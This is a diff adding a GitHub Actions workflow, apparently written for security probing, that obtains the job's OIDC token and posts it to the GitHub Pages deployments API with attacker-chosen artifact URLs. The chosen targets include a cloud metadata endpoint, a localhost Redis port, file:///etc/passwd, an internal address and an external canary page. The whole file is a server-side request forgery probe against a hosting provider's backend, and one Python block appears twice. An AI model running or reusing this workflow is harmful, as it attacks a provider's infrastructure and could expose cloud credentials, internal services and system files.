@@ -1,0 +1,65 @@
+name: pages-deploy-api-abuse4
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'mode'
+        required: true
+        default: 'artifact_url'
+        type: string
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - name: get oidc
+        id: tok
+        run: |
+          T=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+               "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${REPO_FULL}" || true)
+          V=$(echo "$T" | python3 -c "import sys,json
+          try:
+            print(json.load(sys.stdin).get('value',''))
+          except Exception:
+            print('')")
+          echo "token_len=${#V}"
+          echo "token=$V" >> "$GITHUB_OUTPUT"
+      - name: call API
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          OIDC: ${{ steps.tok.outputs.token }}
+          MODE: ${{ inputs.mode }}
+          REPO: ${{ github.repository }}
+        run: |
+          if [ -z "$OIDC" ]; then echo "NO OIDC TOKEN - abort"; exit 1; fi
+          case "$MODE" in
+            artifact_url) URL="https://madaraninja1337.github.io/canary/1791280213.html" ;;
+            metadata)     URL="http://169.254.169.254/latest/meta-data/" ;;
+            localhost)    URL="http://127.0.0.1:6379/INFO" ;;
+            file)         URL="file:///etc/passwd" ;;
+            internal)     URL="http://10.0.0.1/" ;;
+            preview)      URL="" ;;
+          esac
+          if [ "$MODE" = "preview" ]; then
+            AID=$(gh api /repos/$REPO/actions/runs/${GITHUB_RUN_ID}/artifacts -q '.artifacts[0].id')
+            python3 -c "
+          import json,os
+          body={'pages_build_version':'pwn-preview','artifact_id':int(os.environ['AID']),'preview':True,'oidc_token':os.environ['OIDC']}
+          open('/tmp/p.json','w').write(json.dumps(body))" AID=$AID
+            AID=$AID python3 -c "
+          import json,os
+          body={'pages_build_version':'pwn-preview','artifact_id':int(os.environ['AID']),'preview':True,'oidc_token':os.environ['OIDC']}
+          open('/tmp/p.json','w').write(json.dumps(body))"
+            echo "MODE=preview AID=$AID"
+          else
+            URL="$URL" python3 -c "
+          import json,os
+          body={'pages_build_version':'pwn','artifact_url':os.environ['URL'],'oidc_token':os.environ['OIDC']}
+          open('/tmp/p.json','w').write(json.dumps(body))"
+            echo "MODE=$MODE URL=$URL"
+          fi
+          gh api -X POST /repos/$REPO/pages/deployments --input /tmp/p.json 2>&1 | head -20
